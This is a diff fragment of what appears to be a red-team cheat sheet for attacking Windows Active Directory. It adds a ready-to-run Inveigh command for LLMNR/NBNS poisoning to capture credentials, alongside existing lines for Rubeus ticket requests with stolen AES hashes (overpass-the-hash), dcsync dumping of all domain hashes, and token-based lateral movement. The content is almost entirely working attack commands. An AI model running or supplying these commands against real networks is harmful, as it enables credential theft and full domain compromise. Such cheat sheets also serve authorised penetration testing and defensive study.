@@ -167,6 +167,12 @@ Overpass the Hash
   dcsync fqdn (dump entire domain hashes)
   Rubeus.exe asktgt /user:USER /enctype:AES256 /aes256:HASH /domain:FQDN /dc:DC_NAME /ptt
 
+Inveigh
+  Import Inveigh Powershell Script
+  Invoke-Inveigh -ConsoleOutput N -RunTime 30 -Tool 2 -LLMNR Y -NBNS Y -StatusOutput Y
+  * Agressor script: https://github.com/Und3rf10w/Aggressor-scripts
+  
+
 Lateral Movement
   make_token username password
     ls \\target\c$ (verify permissions)
